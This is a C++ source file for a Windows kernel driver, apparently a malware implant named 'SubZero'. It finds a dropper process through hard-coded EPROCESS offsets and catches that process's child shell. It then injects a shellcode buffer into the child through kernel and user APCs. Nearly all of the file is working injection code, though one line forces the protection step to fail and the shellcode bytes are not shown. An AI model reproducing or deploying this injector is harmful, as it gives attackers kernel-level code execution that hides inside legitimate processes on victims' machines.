#include "pch.h"
#include "SubZero.h"

Globals g_Globals;
DRIVER_UNLOAD SubZeroUnload;
DRIVER_DISPATCH SubZeroCreateClose, SubZeroRead;
void OnProcessNotify(PEPROCESS Process, HANDLE ProcessId, PPS_CREATE_NOTIFY_INFO CreateInfo);
void OnThreadNotify(HANDLE ProcessId, HANDLE ThreadId, BOOLEAN Create);
bool FindProcessByName(CHAR* process_name, PEPROCESS* process);
void KernelApc(PKAPC apc, PKNORMAL_ROUTINE*, PVOID*, PVOID*, PVOID*);
void RundownApc(PKAPC apc);
void NormalApc(PVOID, PVOID, PVOID);

extern "C" NTSTATUS
DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING) {
	auto status = STATUS_SUCCESS;

	KdPrint((DRIVER_PREFIX "[+] Driver was loaded"));

	PDEVICE_OBJECT DeviceObject = nullptr;
	UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\??\\subzero");
	bool symLinkCreated = false;

	do {
		UNICODE_STRING devName = RTL_CONSTANT_STRING(L"\\Device\\subzero");
		status = IoCreateDevice(DriverObject, 0, &devName,
			FILE_DEVICE_UNKNOWN, 0, TRUE, &DeviceObject);
		if (!NT_SUCCESS(status)) {
			DbgPrint(DRIVER_PREFIX "[-] Failed to create device (0x%08X)\n",
				status);
			break;
		}
		DeviceObject->Flags |= DO_DIRECT_IO;

		status = IoCreateSymbolicLink(&symLink, &devName);
		if (!NT_SUCCESS(status)) {
			DbgPrint(DRIVER_PREFIX "[-] Failed to create sym link (0x%08X)\n",
				status);
			break;
		}
		symLinkCreated = true;

		// register for process notifications
		status = PsSetCreateProcessNotifyRoutineEx(OnProcessNotify, FALSE);
		if (!NT_SUCCESS(status)) {
			DbgPrint(DRIVER_PREFIX "[-] Failed to register process callback (0x%08X)\n", status);
			break;
		}

		// register for thread notifications
		status = PsSetCreateThreadNotifyRoutine(OnThreadNotify);
		if (!NT_SUCCESS(status)) {
			KdPrint((DRIVER_PREFIX "[-] Failed to set thread callbacks (status=%08X)\n", status));
			break;
		}
	} while (false);

	if (!NT_SUCCESS(status)) {
		if (symLinkCreated)
			IoDeleteSymbolicLink(&symLink);
		if (DeviceObject)
			IoDeleteDevice(DeviceObject);
	}

	PEPROCESS dropperEprocess;
	if (FindProcessByName("SubZeroClient.", &dropperEprocess)) {
		g_Globals.DropperProcessID = HandleToULong(PsGetProcessId(dropperEprocess));
		KdPrint((DRIVER_PREFIX "[+] SubZeroClient found. PID: %d", g_Globals.DropperProcessID));
	}
	else KdPrint((DRIVER_PREFIX "[-] SubZeroClient.exe not found."));

	::ExInitializeRundownProtection(&g_Globals.RundownProtection);

	DriverObject->DriverUnload = SubZeroUnload;
	DriverObject->MajorFunction[IRP_MJ_CREATE] = DriverObject->MajorFunction[IRP_MJ_CLOSE] = SubZeroCreateClose;
	DriverObject->MajorFunction[IRP_MJ_READ] = SubZeroRead;
	return status;
}

void SubZeroUnload(PDRIVER_OBJECT DriverObject) {
	// unregister all notifications in case of KAPC faliure
	PsSetCreateProcessNotifyRoutineEx(OnProcessNotify, TRUE);
	PsRemoveCreateThreadNotifyRoutine(OnThreadNotify);

	// Wait for KAPC to finish in case of an error
	::ExWaitForRundownProtectionRelease(&g_Globals.RundownProtection);

	// Delete device
	UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\??\\subzero");
	IoDeleteSymbolicLink(&symLink);
	IoDeleteDevice(DriverObject->DeviceObject);

	KdPrint((DRIVER_PREFIX "[+] Driver unloaded successfully"));
}

NTSTATUS SubZeroCreateClose(PDEVICE_OBJECT, PIRP Irp) {
	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp, 0);
	return STATUS_SUCCESS;
}

NTSTATUS SubZeroRead(PDEVICE_OBJECT, PIRP Irp) {
	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp, 0);
	return STATUS_SUCCESS;
}

void OnProcessNotify(PEPROCESS Process, HANDLE ProcessId, PPS_CREATE_NOTIFY_INFO CreateInfo) {
	UNREFERENCED_PARAMETER(Process);
	UNREFERENCED_PARAMETER(ProcessId);

	// Process creation only
	if (!CreateInfo) return;

	// Search for the dropper's child process
	auto pid = HandleToULong(ProcessId);
	if (HandleToULong(CreateInfo->ParentProcessId) == g_Globals.DropperProcessID) {
		KdPrint((DRIVER_PREFIX "[+] Shell process catched. PID: %d", pid));
		g_Globals.ShellProcessID = pid;
	}
}

void OnThreadNotify(HANDLE ProcessId, HANDLE ThreadId, BOOLEAN Create) {
	// Thread creation only
	if (!Create) return;

	// Search for the shell process' first thread
	if (!(g_Globals.ShellProcessID == HandleToULong(ProcessId))) return;

	auto tid = HandleToULong(ThreadId);
	KdPrint((DRIVER_PREFIX "[+] Shell process main thread catched. TID: %d", tid));

	PKAPC apc = (KAPC*)ExAllocatePoolWithTag(NonPagedPool, sizeof(KAPC), DRIVER_TAG);
	if (!apc) {
		KdPrint((DRIVER_PREFIX "[-] Error allocating Kernel APC memory"));
		return;
	}

	PETHREAD thread;
	::PsLookupThreadByThreadId(ThreadId, &thread);

	::KeInitializeApc(
		apc,
		thread,
		OriginalApcEnvironment,
		&KernelApc,
		&RundownApc,
		&NormalApc,
		KernelMode,
		nullptr
	);

	if (::ExAcquireRundownProtection(&g_Globals.RundownProtection)) {
		auto inserted = ::KeInsertQueueApc(
			apc,
			nullptr,
			nullptr,
			0
		);

		if (!inserted) {
			::ExFreePoolWithTag(apc, DRIVER_TAG);
			::ExReleaseRundownProtection(&g_Globals.RundownProtection);
			KdPrint((DRIVER_PREFIX "[-] Error inserting kernel APC.\n"));
			return;
		}
		else KdPrint((DRIVER_PREFIX "[+] KAPC queued successfully"));
	}
	else KdPrint((DRIVER_PREFIX "[-] Error acquiring rundown protection.\n"));
}

bool FindProcessByName(CHAR* processName, PEPROCESS* process)
{
	PEPROCESS initialSystemProcess = PsInitialSystemProcess;
	PEPROCESS currentEntry = initialSystemProcess;

	CHAR imageName[30];

	do
	{
		RtlCopyMemory((PVOID)(&imageName), (PVOID)((uintptr_t)currentEntry + 0x450) /* EPROCESS->ImageFileName */, sizeof(imageName));

		//KdPrint((DRIVER_PREFIX "[*] %s", image_name));

		if (strstr(imageName, processName))
		{
			ULONG activeThreads;
			RtlCopyMemory((PVOID)&activeThreads, (PVOID)((uintptr_t)currentEntry + 0x498) /* EPROCESS->ActiveThreads */, sizeof(activeThreads));
			if (activeThreads)
			{
				*process = currentEntry;
				return true;
			}
		}

		PLIST_ENTRY list = (PLIST_ENTRY)((uintptr_t)(currentEntry)+0x2F0); // EPROCESS->ActiveProcessLinks
		currentEntry = (PEPROCESS)((uintptr_t)list->Flink - 0x2F0);  // Same as CONTAINING_RECORD macro

	} while (currentEntry != initialSystemProcess);

	return false;


}

// TODO: Read on APCs
void KernelApc(PKAPC apc, PKNORMAL_ROUTINE*, PVOID*, PVOID*, PVOID*) { ::ExFreePoolWithTag(apc, DRIVER_TAG); }

void RundownApc(PKAPC apc) { 
	::ExFreePoolWithTag(apc, DRIVER_TAG);
	::ExReleaseRundownProtection(&g_Globals.RundownProtection);
}

void NormalApc(PVOID, PVOID, PVOID) {
	KdPrint((DRIVER_PREFIX "[+] KAPC invoked"));

	// Unregister all notifications
	PsSetCreateProcessNotifyRoutineEx(OnProcessNotify, TRUE);
	PsRemoveCreateThreadNotifyRoutine(OnThreadNotify);

	size_t shellcodeSize = sizeof(Shellcode);
	HANDLE hProcess = ZwCurrentProcess();

	// Allocate shellcode's memory
	void* address{};
	auto status = ::ZwAllocateVirtualMemory(
		hProcess,
		&address,
		0,
		&shellcodeSize,
		MEM_RESERVE | MEM_COMMIT,
		PAGE_EXECUTE_READ
	);
	if (!NT_SUCCESS(status)) {
		KdPrint((DRIVER_PREFIX "[-] ZwAllocateVirtualMemory failed (0x%08X)", status));
		::ExReleaseRundownProtection(&g_Globals.RundownProtection);
		return;
	}
	
	PMDL mdl;
	PVOID mappedAddress = nullptr;
	bool successfull = false;
	do
	{
		// Allocate MDL
		mdl = ::IoAllocateMdl(
			address,
			sizeof(Shellcode),
			false,
			false,
			nullptr
		);
		if (!mdl) break;

		::MmProbeAndLockPages(
			mdl,
			KernelMode,
			IoReadAccess
		);

		// Lock to kernel memory
		mappedAddress = ::MmMapLockedPagesSpecifyCache(
			mdl,
			KernelMode,
			MmNonCached,
			nullptr,
			false,
			NormalPagePriority
		);
		if (!mappedAddress) break;

		// Change protection
		status = ::MmProtectMdlSystemAddress(mdl, PAGE_READWRITE);
		status = STATUS_ACCESS_DENIED;
		if (NT_SUCCESS(status))
			successfull = true;

	} while (false);

	if (!successfull) {
		if (mdl) { 
			if (mappedAddress) {
				KdPrint((DRIVER_PREFIX "[-] Error protecting MDL pages"));
				::MmUnmapLockedPages(mappedAddress, mdl);
			}
			else KdPrint((DRIVER_PREFIX "[-] Error mapping MDL"));
			::MmUnlockPages(mdl);
			::IoFreeMdl(mdl); 
		}
		else KdPrint((DRIVER_PREFIX "[-] Error allocating MDL"));
		::ExReleaseRundownProtection(&g_Globals.RundownProtection);
		return;
	}

	// Copy shellcode
	if (int errorCode = ::memcpy_s(mappedAddress, sizeof(Shellcode), Shellcode, sizeof(Shellcode))) {
		KdPrint((DRIVER_PREFIX "[-] Error copying shellcode to (0x%llx). Error code: (0x%08X)", mappedAddress, errorCode));
		::ExReleaseRundownProtection(&g_Globals.RundownProtection);
		return;
	}
	KdPrint((DRIVER_PREFIX "[+] Shellcode copied to (0x%llx). Size: %d", mappedAddress, shellcodeSize));

	// Free MDL pages
	::MmUnmapLockedPages(mappedAddress, mdl);
	::MmUnlockPages(mdl);
	::IoFreeMdl(mdl);

	// Insert user APC that will run the shellcode
	PKAPC apc = (KAPC*)ExAllocatePoolWithTag(NonPagedPool, sizeof(KAPC), DRIVER_TAG);
	if (!apc) {
		KdPrint((DRIVER_PREFIX "[-] Error allocating user APC memory"));
		::ExReleaseRundownProtection(&g_Globals.RundownProtection);
		return;
	}

	::KeInitializeApc(
		apc,
		::KeGetCurrentThread(),
		OriginalApcEnvironment,
		&KernelApc,
		&RundownApc,
		reinterpret_cast<PKNORMAL_ROUTINE>(address),
		UserMode,
		nullptr
	);

	auto inserted = ::KeInsertQueueApc(
		apc,
		nullptr,
		nullptr,
		0
	);
	if (!inserted) {
		KdPrint((DRIVER_PREFIX "[-] Error inserting user APC.\n"));
		::ExFreePoolWithTag(apc, DRIVER_TAG);
		::ExReleaseRundownProtection(&g_Globals.RundownProtection);
		return;
	}

	::ExReleaseRundownProtection(&g_Globals.RundownProtection);
	KdPrint((DRIVER_PREFIX "[+] Code Injected and APC queued successfully"));
}

//NTSTATUS GetParentProcessId(__in HANDLE processId, __out PHANDLE parentProcessId)
//{
//
//	NTSTATUS status;
//	PEPROCESS eProcess;
//	HANDLE hProcess = NULL;
//	PROCESS_BASIC_INFORMATION pbi;
//
//	PAGED_CODE(); // this eliminates the possibility of the IDLE Thread / Process
//
//		if (processId == (HANDLE)4) { // if system process
//
//			*parentProcessId = 0;
//
//			return STATUS_SUCCESS;
//		}
//
//	status = PsLookupProcessByProcessId(processId, &eProcess);
//
//	if (NT_SUCCESS(status))
//	{
//		status = ObOpenObjectByPointer(eProcess, 0, NULL,
//			0, 0, KernelMode, &hProcess);
//		if (!NT_SUCCESS(status))
//		{
//			// DbgPrint("Error: ObOpenObjectByPointer Failed: %08x\n", status);
//		}
//		ObDereferenceObject(eProcess);
//	}
//	else {
//		//DbgPrint("Error: PsLookupProcessByProcessId Failed: %08x\n", status);
//	}
//
//	if (NULL == ZwQueryInformationProcess) {
//
//		UNICODE_STRING routineName;
//
//		RtlInitUnicodeString(&routineName, L"ZwQueryInformationProcess");
//
//		ZwQueryInformationProcess =
//			(QUERY_INFO_PROCESS)MmGetSystemRoutineAddress(&routineName);
//
//		if (NULL == ZwQueryInformationProcess) {
//			DbgPrint("Cannot resolve ZwQueryInformationProcess\n");
//		}
//	}
//
//	/* Retrieve the process basic information (pbi) from the handle of the
//	process */
//	status = ZwQueryInformationProcess(hProcess,
//		ProcessBasicInformation,
//		&pbi,
//		sizeof(PROCESS_BASIC_INFORMATION),
//		NULL);
//
//	if (NT_SUCCESS(status)) {
//		*parentProcessId = (HANDLE)pbi.InheritedFromUniqueProcessId;
//	}
//
//	return status;
//}